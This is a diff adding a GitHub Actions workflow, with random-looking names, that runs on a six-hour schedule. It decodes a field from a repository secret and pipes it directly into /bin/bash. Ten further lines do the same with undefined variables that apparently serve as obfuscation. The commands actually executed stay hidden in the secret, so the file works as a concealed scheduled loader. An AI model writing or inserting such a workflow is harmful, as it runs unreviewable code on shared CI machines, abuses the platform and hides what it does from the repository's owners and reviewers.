@@ -1,0 +1,27 @@
+name: laifengminglv
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laifengminglv
+        env:
+          t3768: ${{ secrets.t3768 }}
+        run: |
+          echo $t3768 | jq -r .lhxy34 | /bin/bash
+          echo $bfl367 | jq -r .d5 | /bin/bash
+          echo $vr11702 | jq -r .giplv16451 | /bin/bash
+          echo $mz447 | jq -r .mhe959 | /bin/bash
+          echo $tg5 | jq -r .hpja46 | /bin/bash
+          echo $vmncb8822 | jq -r .btpd95 | /bin/bash
+          echo $nahmf70383 | jq -r .sqb21240 | /bin/bash
+          echo $d1822 | jq -r .xpawn79007 | /bin/bash
+          echo $hiee7202 | jq -r .v4 | /bin/bash
+          echo $slna72 | jq -r .nuxlx92206 | /bin/bash
+          echo $glvvk045 | jq -r .r0 | /bin/bash
+
